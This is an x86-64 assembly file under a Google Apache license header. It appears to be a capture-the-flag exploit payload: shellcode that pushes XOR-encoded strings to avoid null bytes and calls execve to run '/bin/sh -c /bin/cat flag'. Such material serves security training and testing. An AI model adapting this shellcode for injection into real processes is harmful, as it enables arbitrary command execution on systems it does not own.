;Copyright 2019 Google LLC
;
;Licensed under the Apache License, Version 2.0 (the "License");
;you may not use this file except in compliance with the License.
;You may obtain a copy of the License at
;
;    https://www.apache.org/licenses/LICENSE-2.0
;
;Unless required by applicable law or agreed to in writing, software
;distributed under the License is distributed on an "AS IS" BASIS,
;WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
;See the License for the specific language governing permissions and
;limitations under the License.

BITS 64
GLOBAL _start
SECTION .text
_start:
    ; execve(path='/bin/sh', argv=['sh', '-c', '/bin/cat flag'], envp=0) */
    ; push '/bin/sh\x00' */
    mov rax, 0x101010101010101
    push rax
    mov rax, 0x101010101010101 ^ 0x68732f6e69622f
    xor [rsp], rax
    mov rdi, rsp
    ; push argument array ['sh\x00', '-c\x00', '/bin/cat flag\x00'] */
    ; push 'sh\x00-c\x00/bin/cat flag\x00' */
    push 0x1010101 ^ 0x67616c
    xor dword [rsp], 0x1010101
    mov rax, 0x66207461632f6e69
    push rax
    mov rax, 0x101010101010101
    push rax
    mov rax, 0x101010101010101 ^ 0x622f00632d006873
    xor [rsp], rax
    xor esi, esi ; 0 */
    push rsi ; null terminate */
    push 0xe
    pop rsi
    add rsi, rsp
    push rsi ; '/bin/cat flag\x00' */
    push 0x13
    pop rsi
    add rsi, rsp
    push rsi ; '-c\x00' */
    push 0x18
    pop rsi
    add rsi, rsp
    push rsi ; 'sh\x00' */
    mov rsi, rsp
    xor edx, edx ; 0 */
    ; call execve() */
    push 0x3b
    pop rax
    syscall
